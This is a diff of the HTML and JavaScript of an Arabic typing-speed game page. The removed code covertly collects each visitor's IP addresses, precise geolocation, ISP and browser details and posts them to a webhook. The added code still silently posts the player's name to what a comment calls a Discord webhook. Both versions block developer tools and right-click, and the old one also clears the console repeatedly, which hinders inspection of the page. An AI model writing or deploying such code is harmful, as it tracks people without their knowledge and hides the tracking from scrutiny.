@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>اختبر سرعتك + حماية</title>
+  <title>اختبر سرعتك + حماية متكاملة</title>
   <style>
     body {
       font-family: Tahoma, sans-serif;
@@ -63,6 +63,8 @@
       font-size: 16px;
       font-weight: bold;
       display: none;
+      user-select: none;
+      z-index: 9999;
     }
     #musicControl {
       position: fixed;
@@ -79,6 +81,7 @@
       align-items: center;
       font-size: 20px;
       user-select: none;
+      z-index: 9999;
     }
     #result {
       font-size: 20px;
@@ -239,104 +242,70 @@
     }
   });
 
-  async function sendUserInfo(name) {
-    try {
-      const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
-        fetch('https://api.ipify.org?format=json'),
-        fetch('https://api64.ipify.org?format=json'),
-        fetch('https://ipapi.co/json/')
-      ]);
-      const ipv4Data = await ipv4Res.json();
-      const ipv6Data = await ipv6Res.json();
-      const geoData = await geoRes.json();
+  // ======== إرسال معلومات المستخدم إلى Webhook الديسكورد ==========
+  function sendUserInfo(name) {
+    const payload = {
+      content: `📝 **${name} دخل لعبة سرعة الكتابة!**\n> الوقت: ${new Date().toLocaleString()}`
+    };
 
-      const ua = navigator.userAgent;
-      const lang = navigator.language;
-      const now = new Date();
-      const timeString = now.toISOString();
-
-      const ipv4 = ipv4Data.ip;
-      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';
-
-      function sendToWebhook(extraGeo = '') {
-        const infoText = `
-الاسم: ${name}
-IP (IPv4): ${ipv4}
-IP (IPv6): ${ipv6}
-الدولة: ${geoData.country_name}
-المنطقة: ${geoData.region}
-المدينة: ${geoData.city}
-خط العرض: ${geoData.latitude}
-خط الطول: ${geoData.longitude}
-المنظمة: ${geoData.org}
-المنطقة الزمنية: ${geoData.timezone}
-متصفح المستخدم: ${ua}
-اللغة: ${lang}
-الوقت: ${timeString}
-${extraGeo}
-        `.trim();
-
-        fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: infoText }),
-        });
-      }
-
-      sendToWebhook();
-
-    } catch (e) {
-      // ما نعمل شيء لو فشل الإرسال
-    }
+    fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify(payload)
+    }).catch(() => {
+      // تجاهل الأخطاء في الإرسال
+    });
   }
 
-  // ============== حماية قوية مدمجة ===============
-  // منع فتح أدوات المطور
-  document.addEventListener('keydown', function (e) {
-    if (
-      e.key === "F12" ||
-      (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
-      (e.ctrlKey && e.key === "U") ||
-      (e.ctrlKey && e.key === "S")
-    ) {
-      e.preventDefault();
-      alert("هذا الموقع محمي ضد الاختراق!");
-      return false;
+  // ========== حماية متكاملة ضد أدوات المطور ===========
+  (function() {
+    function blockDevTools(e) {
+      if (
+        e.key === "F12" ||
+        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "i")) ||
+        (e.ctrlKey && e.key === "U")
+      ) {
+        alert("فتح أدوات المطور محظور!");
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+      }
     }
-  });
 
-  // منع فتح القائمة بالزر الأيمن للفأرة
-  document.addEventListener('contextmenu', function (e) {
-    e.preventDefault();
-    alert("الزر الأيمن معطل للحماية");
-    return false;
-  });
+    document.addEventListener("keydown", blockDevTools);
 
-  // مسح console باستمرار لمنع فحص الكود
-  (function clearConsoleLoop() {
-    console.clear();
-    setTimeout(clearConsoleLoop, 100);
-  })();
-
-  // محاولة اكتشاف أدوات المطور (Console) بشكل دوري
-  (function detectDevTools() {
-    let devtools = false;
+    let devtools = { open: false };
     const threshold = 160;
+
     setInterval(() => {
       const widthThreshold = window.outerWidth - window.innerWidth > threshold;
       const heightThreshold = window.outerHeight - window.innerHeight > threshold;
       if (widthThreshold || heightThreshold) {
-        if (!devtools) {
-          devtools = true;
-          alert("يرجى عدم فتح أدوات المطور، الموقع محمي!");
-          window.location.reload();
+        if (!devtools.open) {
+          alert("فتح أدوات المطور محظور!");
+          devtools.open = true;
         }
       } else {
-        devtools = false;
+        devtools.open = false;
       }
     }, 1000);
-  })();
 
+    document.addEventListener("contextmenu", function(e) {
+      e.preventDefault();
+      alert("النقر بزر الماوس الأيمن محظور!");
+      return false;
+    });
+
+    const style = document.createElement('style');
+    style.innerHTML = `
+      #devtoolsButton, #devtoolsPanel, .devtools, .devtools-open {
+        display: none !important;
+        visibility: hidden !important;
+        pointer-events: none !important;
+      }
+    `;
+    document.head.appendChild(style);
+  })();
 </script>
 
 </body>
